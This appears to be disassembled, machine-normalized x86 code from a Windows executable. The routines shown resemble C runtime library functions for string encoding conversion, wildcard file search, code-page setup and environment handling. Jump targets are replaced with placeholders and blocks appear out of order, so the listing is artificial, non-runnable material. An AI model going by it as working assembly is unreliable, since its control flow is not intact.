sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
xor esi esi
push [ ebp - 0x8 ]
push ebx
push esi
push [ ebp + 0x14 ]
push 0x1
push edi
call [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_419b3e
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_4297c0
mov ebx esp
test ebx ebx
je r-xdata
mov edi [ ebp - 0x8 ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41c293
mov esi eax
test esi esi
je r-xdata
mov [ ebx ] 0xdddd
mov [ ebx ] 0xcccc
jmp r-xdata
test [ ebp + 0x10 ] 0x400
je r-xdata
test ebx ebx
je r-xdata
add ebx 0x8
jmp r-xdata
lea edx [ esi + esi ]
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
test ecx eax
je r-xdata
mov eax [ ebp + 0x20 ]
test eax eax
je r-xdata
xor edi edi
lea ecx [ edx + 0x8 ]
cmp edx ecx
sbb eax eax
and eax ecx
lea ecx [ edx + 0x8 ]
cmp eax 0x400
ja r-xdata
push ebx
call sub_40f0cb
pop ecx
mov eax esi
cmp esi eax
jg r-xdata
push edi
call sub_40f0cb
pop ecx
push 0x0
push 0x0
push 0x0
push esi
push edi
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41c293
test eax eax
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
push eax
call sub_419b3e
mov edi eax
pop ecx
test edi edi
je r-xdata
cmp edx ecx
sbb eax eax
and eax ecx
call sub_4297c0
mov edi esp
test edi edi
je r-xdata
xor ecx ecx
push ecx
push ecx
push ecx
push eax
push [ ebp + 0x1c ]
push edi
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41c293
mov esi eax
test esi esi
jne r-xdata
xor eax eax
push eax
push eax
cmp [ ebp + 0x20 ] eax
jne r-xdata
mov [ edi ] 0xdddd
mov [ edi ] 0xcccc
jmp r-xdata
jmp r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
jmp r-xdata
push eax
push eax
test edi edi
je r-xdata
add edi 0x8
jmp r-xdata
push esi
push edi
push eax
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test esi esi
jne r-xdata
push edi
call sub_40f0cb
pop ecx
jmp r-xdata
sub_41e073
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_414048
push [ ebp + 0x28 ]
lea eax [ ebp - 0xc ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_41de56
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41e0be
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax [ ebp + 0x8 ]
jbe r-xdata
sbb eax eax
neg eax
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
sub_41e0d6
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x2c ] eax
push esi
mov esi [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor ecx ecx
push ebx
push edi
mov [ eax ] ecx
mov edi ecx
mov ebx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ecx
cmp [ esi ] ecx
je r-xdata
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
mov eax ebx
mov [ ebp - 0x14 ] ecx
sub eax edi
xor ecx ecx
mov edx eax
mov [ ebp - 0x10 ] ecx
sar edx 0x2
add eax 0x3
inc edx
shr eax 0x2
cmp ebx edi
mov [ ebp - 0x18 ] edx
sbb esi esi
not esi
and esi eax
je r-xdata
push 0x2a
pop eax
mov [ ebp - 0xc ] ax
push 0x3f
pop eax
mov [ ebp - 0xa ] ax
xor eax eax
mov [ ebp - 0x8 ] ax
lea eax [ ebp - 0xc ]
push eax
push [ esi ]
call sub_4207e5
pop ecx
pop ecx
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop esi
call sub_40d56a
mov esp ebp
pop ebp
retn
push 0x2
push [ ebp - 0x14 ]
push edx
call sub_41742c
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov ebx [ ebp - 0x14 ]
mov edx edi
lea ecx [ ebp - 0x28 ]
push ecx
push eax
push [ esi ]
call sub_41e341
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
xor eax eax
push eax
push eax
push [ esi ]
call sub_41e2a3
add esp 0x10
jmp r-xdata
mov eax [ ebp - 0x18 ]
lea eax [ esi + eax * 4 ]
mov [ ebp - 0x30 ] eax
mov edx eax
mov [ ebp - 0x18 ] edx
cmp edi ebx
je r-xdata
or edi 0xffffffff
jmp r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1c ]
jne r-xdata
sub ecx [ ebp - 0x14 ]
inc ebx
mov eax [ ebp - 0x10 ]
add edx 0x4
sar ecx 0x1
add ebx ecx
inc eax
mov [ ebp - 0x10 ] eax
cmp eax esi
jne r-xdata
lea ecx [ ebp - 0x28 ]
call sub_41e4f7
mov eax edi
pop edi
pop ebx
add esi 0x4
xor ecx ecx
cmp [ esi ] ecx
jne r-xdata
mov edi eax
test edi edi
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ eax ] esi
xor eax eax
mov edi eax
mov eax esi
sub eax edi
mov [ ebp - 0xc ] eax
push eax
call sub_41a3a5
pop ecx
mov ecx [ edx ]
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x18 ]
mov [ ebp - 0x14 ] ebx
mov ebx [ ebp - 0x24 ]
mov ebx [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1c ]
jne r-xdata
sub ecx [ ebp - 0x10 ]
sar ecx 0x1
lea eax [ ecx + 0x1 ]
mov ecx edx
sub ecx [ ebp - 0x30 ]
push eax
push [ edi ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
sar ecx 0x1
sub eax ecx
push eax
push edx
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x18 ]
mov [ eax + edi ] edx
add edi 0x4
mov eax [ ebp - 0x10 ]
lea edx [ edx + eax * 2 ]
mov [ ebp - 0x18 ] edx
cmp edi ebx
jne r-xdata
mov ecx [ edi ]
lea eax [ ecx + 0x2 ]
mov [ ebp - 0x10 ] eax
sub_41e2a3
mov edi edi
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push edi
xor ebx ebx
lea edx [ ecx + 0x2 ]
mov ax [ ecx ]
add ecx 0x2
cmp ax bx
jne r-xdata
mov edi [ ebp + 0x10 ]
sub ecx edx
sar ecx 0x1
or eax 0xffffffff
inc ecx
sub eax edi
mov [ ebp - 0x4 ] ecx
cmp ecx eax
jbe r-xdata
push esi
lea ebx [ edi + 0x1 ]
add ebx ecx
push 0x2
push ebx
call sub_41942e
mov esi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push 0xc
pop eax
jmp r-xdata
push [ ebp - 0x4 ]
sub ebx edi
lea eax [ esi + edi * 2 ]
push [ ebp + 0x8 ]
push ebx
push eax
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
push edi
push [ ebp + 0xc ]
push ebx
push esi
call sub_41f7c7
add esp 0x10
test eax eax
jne r-xdata
pop edi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413b2e
int3
mov ecx [ ebp + 0x14 ]
push esi
call sub_41e51c
push 0x0
mov esi eax
call sub_41a3a5
pop ecx
mov eax esi
pop esi
sub_41e341
mov edi edi
push ebp
mov ebp esp
sub esp 0x260
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x5c
pop esi
push 0x3a
mov [ ebp - 0x258 ] edx
mov [ ebp - 0x25c ] 0x2f
pop edi
jmp r-xdata
cmp ecx ebx
jne r-xdata
movzx eax [ ecx ]
cmp ax [ ebp - 0x25c ]
je r-xdata
movzx esi [ ecx ]
cmp si di
jne r-xdata
cmp ax si
je r-xdata
push 0x2f
mov eax esi
xor edi edi
pop edx
cmp ax dx
je r-xdata
lea eax [ ebx + 0x2 ]
cmp ecx eax
je r-xdata
cmp ax di
je r-xdata
xor eax eax
inc eax
push 0x5c
pop edx
cmp ax dx
je r-xdata
push edx
xor edi edi
push edi
push edi
push ebx
call sub_41e2a3
add esp 0x10
jmp r-xdata
sub ecx 0x2
mov ecx [ ebp - 0x258 ]
push 0x2e
mov eax [ ecx + 0x4 ]
sub eax [ ecx ]
sar eax 0x2
mov [ ebp - 0x260 ] eax
pop eax
mov eax [ ebp - 0x258 ]
push eax
push edi
push edi
push ebx
call sub_41e2a3
add esp 0x10
push 0x3a
pop edx
cmp ax dx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
push ecx
push [ ebp - 0x25c ]
lea eax [ ebp - 0x228 ]
push ebx
push eax
call sub_41e2a3
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x226 ] di
je r-xdata
mov eax edi
push esi
call [ FindClose@IAT ]
mov eax edi
jmp r-xdata
mov edi eax
lea eax [ ebp - 0x254 ]
push eax
push esi
call [ FindNextFileW@IAT ]
mov ecx [ ebp - 0x258 ]
test eax eax
push 0x2e
pop eax
jne r-xdata
cmp [ ebp - 0x226 ] ax
jne r-xdata
sub ecx ebx
movzx eax al
sar ecx 0x1
inc ecx
neg eax
push 0x250
sbb eax eax
and eax ecx
mov [ ebp - 0x25c ] eax
lea eax [ ebp - 0x254 ]
push edi
push eax
call sub_411230
add esp 0xc
lea eax [ ebp - 0x254 ]
push edi
push edi
push edi
push eax
push edi
push ebx
call [ FindFirstFileExW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
cmp [ ebp - 0x228 ] ax
jne r-xdata
mov eax ecx
mov ecx [ ebp - 0x260 ]
mov edx [ eax ]
mov eax [ eax + 0x4 ]
sub eax edx
sar eax 0x2
cmp ecx eax
je r-xdata
cmp [ ebp - 0x224 ] di
je r-xdata
cmp esi 0xffffffff
je r-xdata
push sub_41e0be
sub eax ecx
push 0x4
push eax
lea eax [ edx + ecx * 4 ]
push eax
call sub_427030
add esp 0x10
jmp r-xdata
sub_41e4f7
mov edi edi
push esi
push edi
mov edi ecx
mov esi [ edi ]
jmp r-xdata
cmp esi [ edi + 0x4 ]
jne r-xdata
push [ esi ]
call sub_41a3a5
pop ecx
add esi 0x4
push [ edi ]
call sub_41a3a5
pop ecx
pop edi
pop esi
retn
sub_41e51c
mov edi edi
push ebp
mov ebp esp
push esi
push edi
mov esi ecx
call sub_41e551
mov edi eax
test edi edi
je r-xdata
mov ecx [ esi + 0x4 ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
add [ esi + 0x4 ] 0x4
xor eax eax
push [ ebp + 0x8 ]
call sub_41a3a5
pop ecx
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_41e551
mov edi edi
push esi
mov esi ecx
push edi
mov edi [ esi + 0x8 ]
cmp [ esi + 0x4 ] edi
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
sub edi [ esi ]
sar edi 0x2
cmp edi 0x7fffffff
ja r-xdata
push 0x4
push 0x4
call sub_41942e
push 0x0
mov [ esi ] eax
call sub_41a3a5
mov eax [ esi ]
add esp 0xc
test eax eax
jne r-xdata
pop edi
pop esi
retn
push 0xc
pop eax
jmp r-xdata
push ebx
push 0x4
lea ebx [ edi + edi ]
push ebx
push [ esi ]
call sub_41f1d3
add esp 0xc
test eax eax
jne r-xdata
mov [ esi + 0x4 ] eax
add eax 0x10
mov [ esi + 0x8 ] eax
jmp r-xdata
mov [ esi ] eax
lea ecx [ eax + edi * 4 ]
lea eax [ eax + ebx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi + 0x8 ] eax
xor esi esi
push 0xc
pop esi
jmp r-xdata
push 0x0
call sub_41a3a5
pop ecx
mov eax esi
pop ebx
sub_41e5e3
push 0x8
push r--data
call sub_40e2a0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_4191c3
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_41e64e
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41e61a
call sub_40e2e6
retn 0xc
sub_41e626
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_41e5e3
mov esp ebp
pop ebp
retn
sub_41e64e
mov edi edi
push esi
mov esi ecx
push 0xc
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x8 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x21c ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0xc
push eax
push 0xc
push rw-data
call sub_41ed6e
mov eax [ esi ]
mov ecx 0x101
push ecx
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0x18
push eax
push ecx
push rw-data
call sub_41ed6e
mov eax [ esi ]
mov ecx 0x100
push ecx
mov eax [ eax ]
mov eax [ eax + 0x48 ]
add eax 0x119
push eax
push ecx
push rw-data
call sub_41ed6e
mov eax [ rw-data ]
add esp 0x30
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
mov [ rw-data ] eax
mov eax [ esi ]
mov eax [ eax ]
mov eax [ eax + 0x48 ]
[ eax ]
pop esi
retn
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
push eax
call sub_41a3a5
pop ecx
sub_41e712
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
sub eax 0x3a4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x4
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0xd
je r-xdata
mov eax [ r--data ]
pop ebp
retn
sub eax 0x1
je r-xdata
mov eax [ r--data ]
pop ebp
retn
xor eax eax
pop ebp
retn
sub_41e750
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push 0x0
call sub_414048
and [ rw-data ] 0x0
mov eax [ ebp + 0x8 ]
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
jmp r-xdata
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ rw-data ] 0x1
mov eax [ eax + 0x8 ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
sub_41e7c3
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x101
xor edi edi
lea esi [ ebx + 0x18 ]
push edi
push esi
call sub_411230
mov [ ebx + 0x4 ] edi
xor eax eax
mov [ ebx + 0x8 ] edi
add esp 0xc
mov [ ebx + 0x21c ] edi
mov ecx 0x101
lea edi [ ebx + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov edi rw-data
sub edi ebx
mov al [ edi + esi ]
mov [ esi ] al
inc esi
sub ecx 0x1
jne r-xdata
lea ecx [ ebx + 0x119 ]
mov edx 0x100
mov al [ ecx + edi ]
mov [ ecx ] al
inc ecx
sub edx 0x1
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_41e828
mov edi edi
push ebp
mov ebp esp
sub esp 0x720
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
mov esi [ ebp + 0x8 ]
lea eax [ ebp - 0x718 ]
push edi
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
xor ebx ebx
mov edi 0x100
test eax eax
je r-xdata
push 0xffffff9f
lea edx [ esi + 0x119 ]
mov ecx ebx
pop eax
sub eax edx
mov [ ebp - 0x720 ] eax
mov eax ebx
cmp [ ebp - 0x71c ] 0x19
ja r-xdata
or [ esi + ecx + 0x19 ] 0x10
lea eax [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x712 ]
lea ecx [ ebp - 0x712 ]
mov [ ebp - 0x104 ] 0x20
jmp r-xdata
mov [ edx ] bl
lea eax [ esi + ecx ]
or [ eax + 0x19 ] 0x20
lea eax [ ecx - 0x20 ]
mov [ edx ] al
jmp r-xdata
test al al
jne r-xdata
add edx ecx
add eax edx
mov [ ebp - 0x71c ] eax
add eax 0x20
cmp eax 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x720 ]
lea edx [ esi + 0x119 ]
inc ecx
cmp ecx edi
jb r-xdata
movzx edx [ ecx + 0x1 ]
movzx eax al
jmp r-xdata
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x704 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push ebx
call sub_42082a
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0x21c ]
push ebx
call sub_41e073
add esp 0x40
lea eax [ ebp - 0x304 ]
push ebx
push [ esi + 0x4 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0x21c ]
push ebx
call sub_41e073
add esp 0x24
mov ecx ebx
cmp eax edx
jbe r-xdata
test al 0x2
je r-xdata
or [ esi + ecx + 0x19 ] 0x10
mov al [ ebp + ecx - 0x204 ]
jmp r-xdata
cmp eax edi
jae r-xdata
add ecx 0x2
mov al [ ecx ]
mov [ esi + ecx + 0x119 ] bl
or [ esi + ecx + 0x19 ] 0x20
mov al [ ebp + ecx - 0x304 ]
mov [ esi + ecx + 0x119 ] al
jmp r-xdata
mov [ ebp + eax - 0x104 ] 0x20
inc eax
movzx eax [ ebp + ecx * 2 - 0x704 ]
test al 0x1
je r-xdata
jmp r-xdata
inc ecx
cmp ecx edi
jb r-xdata
sub_41e9bc
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
call sub_41aa93
mov [ ebp - 0x4 ] eax
call sub_41eadb
push [ ebp + 0x8 ]
call sub_41e750
pop ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov ecx [ ecx + 0x48 ]
cmp eax [ ecx + 0x4 ]
jne r-xdata
push ebx
push esi
push edi
push 0x220
call sub_419b3e
mov edi eax
or ebx 0xffffffff
pop ecx
test edi edi
je r-xdata
xor eax eax
jmp r-xdata
mov esi ebx
mov esi [ ebp - 0x4 ]
mov ecx 0x88
mov esi [ esi + 0x48 ]
[ edi ] [ esi ]
mov edi eax
push edi
push [ ebp - 0xc ]
and [ edi ] 0x0
call sub_41eb7d
mov esi eax
pop ecx
pop ecx
cmp esi ebx
jne r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_41529e
mov [ eax ] 0x16
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
[ eax ] ebx
dec ebx
jne r-xdata
call sub_41819d
mov [ edi ] 0x1
mov ecx edi
mov eax [ ebp - 0x4 ]
xor edi edi
mov [ eax + 0x48 ] ecx
mov eax [ ebp - 0x4 ]
test [ eax + 0x350 ] 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] rw-data
je r-xdata
push edi
call sub_41a3a5
pop ecx
pop edi
mov eax esi
pop esi
pop ebx
test [ rw-data ] 0x1
jne r-xdata
push [ eax + 0x48 ]
call sub_41a3a5
pop ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
push 0x5
call sub_41e626
cmp [ ebp + 0xc ] 0x0
pop ecx
pop ecx
je r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
jmp r-xdata
sub_41eadb
push 0xc
push r--data
call sub_40e2a0
xor esi esi
mov [ ebp - 0x1c ] esi
call sub_41aa93
mov edi eax
mov ecx [ rw-data ]
test [ edi + 0x350 ] ecx
je r-xdata
push 0x5
call sub_4191c3
pop ecx
mov [ ebp - 0x4 ] esi
mov esi [ edi + 0x48 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x4c ] esi
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41eb6c
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x48 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x48 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
[ esi ]
or eax 0xffffffff
[ esi ] eax
jne r-xdata
mov eax esi
call sub_40e2e6
retn
call sub_419afb
cmp esi rw-data
je r-xdata
push esi
call sub_41a3a5
pop ecx
sub_41eb7d
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push esi
push [ ebp + 0x8 ]
mov esi [ ebp + 0xc ]
call sub_41e750
mov ebx eax
pop ecx
test ebx ebx
jne r-xdata
push edi
xor edi edi
mov ecx edi
mov eax edi
mov [ ebp - 0x1c ] ecx
push esi
call sub_41e7c3
pop ecx
xor eax eax
jmp r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_411230
add esp 0xc
imul eax [ ebp - 0x1c ] 0x30
mov [ ebp - 0x20 ] eax
lea eax [ eax + rw-data ]
mov [ ebp - 0x1c ] eax
inc ecx
add eax 0x30
mov [ ebp - 0x1c ] ecx
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_40d56a
mov esp ebp
pop ebp
retn
inc edi
add eax 0x8
mov [ ebp - 0x1c ] eax
cmp edi 0x4
jb r-xdata
mov al [ ecx + 0x1 ]
test al al
je r-xdata
cmp [ eax + rw-data ] ebx
je r-xdata
cmp ebx 0xfde8
je r-xdata
cmp [ eax ] 0x0
mov ecx eax
je r-xdata
push ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] 0x1
call sub_41e712
add esp 0x4
mov [ esi + 0x21c ] eax
mov eax [ ebp - 0x20 ]
lea ecx [ esi + 0xc ]
push 0x6
lea edx [ eax + rw-data ]
pop edi
mov eax [ ebp - 0x1c ]
movzx edx [ ecx ]
movzx eax al
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
cmp ebx 0xfde9
je r-xdata
mov ax [ edx ]
lea edx [ edx + 0x2 ]
mov [ ecx ] ax
lea ecx [ ecx + 0x2 ]
sub edi 0x1
jne r-xdata
push esi
call sub_41e828
cmp edx eax
jbe r-xdata
pop edi
movzx eax bx
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edx 0x100
jae r-xdata
add ecx 0x2
cmp [ ecx ] 0x0
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov al [ edi + rw-data ]
or [ esi + edx + 0x19 ] al
inc edx
movzx eax [ ecx + 0x1 ]
cmp [ rw-data ] edi
je r-xdata
push 0x101
lea eax [ esi + 0x18 ]
push edi
push eax
call sub_411230
mov [ esi + 0x4 ] ebx
add esp 0xc
xor ebx ebx
mov [ esi + 0x21c ] edi
inc ebx
cmp [ ebp - 0x18 ] ebx
jbe r-xdata
push esi
call sub_41e7c3
jmp r-xdata
mov [ esi + 0x8 ] edi
cmp [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x12 ]
je r-xdata
pop ecx
xor eax eax
lea eax [ esi + 0x1a ]
mov ecx 0xfe
mov cl [ eax + 0x1 ]
test cl cl
je r-xdata
or [ eax ] 0x8
inc eax
sub ecx 0x1
jne r-xdata
push [ esi + 0x4 ]
call sub_41e712
add esp 0x4
mov [ esi + 0x21c ] eax
mov [ esi + 0x8 ] ebx
jmp r-xdata
movzx edx cl
movzx ecx [ eax ]
jmp r-xdata
xor eax eax
lea edi [ esi + 0xc ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp ecx edx
jbe r-xdata
or [ esi + ecx + 0x19 ] 0x4
inc ecx
add eax 0x2
cmp [ eax ] 0x0
jne r-xdata
sub_41ed6e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
push edi
mov edi [ ebp + 0x10 ]
test edi edi
je r-xdata
call sub_41529e
push 0x16
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push eax
call sub_411230
add esp 0xc
test edi edi
jne r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
call sub_41529e
push 0x16
jmp r-xdata
push esi
push edi
push eax
call sub_4117a0
add esp 0xc
xor eax eax
jmp r-xdata
push 0x16
pop eax
call sub_41529e
push 0x22
pop esi
mov [ eax ] esi
call sub_413b01
mov eax esi
jmp r-xdata
pop edi
sub_41edef
mov edi edi
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push edi
xor edi edi
cmp [ edx ] di
je r-xdata
lea eax [ edx + 0x2 ]
pop edi
pop ebp
retn
push esi
mov ax [ ecx ]
add ecx 0x2
cmp ax di
jne r-xdata
sub ecx esi
sar ecx 0x1
lea edx [ edx + ecx * 2 ]
add edx 0x2
cmp [ edx ] di
jne r-xdata
mov ecx edx
lea esi [ ecx + 0x2 ]
pop esi
sub_41ee26
mov edi edi
push esi
push edi
call [ GetEnvironmentStringsW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push ebx
push esi
call sub_41edef
sub eax esi
sar eax 0x1
lea ebx [ eax + eax ]
push ebx
call sub_419b3e
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
xor edi edi
jmp r-xdata
push 0x0
call sub_41a3a5
pop ecx
push esi
call [ FreeEnvironmentStringsW@IAT ]
pop ebx
push ebx
push esi
push edi
call sub_4117a0
add esp 0xc
mov eax edi
pop edi
pop esi
retn
sub_41ee76
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
push esi
push edi
push 0x3d
push ebx
mov edi ebx
call sub_42a01b
mov [ ebp - 0xc ] eax
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41529e
mov [ eax ] 0x16
or eax 0xffffffff
jmp r-xdata
call sub_41529e
mov [ eax ] 0x16
cmp eax ebx
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov esi [ rw-data ]
xor ebx ebx
cmp [ eax + 0x2 ] bx
sete cl
mov [ ebp - 0x1 ] cl
cmp esi [ rw-data ]
jne r-xdata
test esi esi
jne r-xdata
push esi
call sub_41f0b3
pop ecx
mov cl [ ebp - 0x1 ]
mov esi eax
mov [ rw-data ] esi
mov ecx [ ebp - 0xc ]
mov eax edi
sub ecx eax
sar ecx 0x1
push ecx
push eax
mov [ ebp - 0xc ] ecx
call sub_41f171
mov [ ebp - 0x8 ] eax
pop ecx
pop ecx
test eax eax
js r-xdata
mov eax [ rw-data ]
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ ebp - 0x1 ] bl
jne r-xdata
cmp [ esi ] ebx
je r-xdata
test cl cl
jne r-xdata
test eax eax
je r-xdata
push edi
call sub_41a3a5
pop ecx
pop edi
mov eax ebx
pop esi
neg eax
mov [ ebp - 0x8 ] eax
lea ecx [ eax + 0x2 ]
cmp ecx eax
jb r-xdata
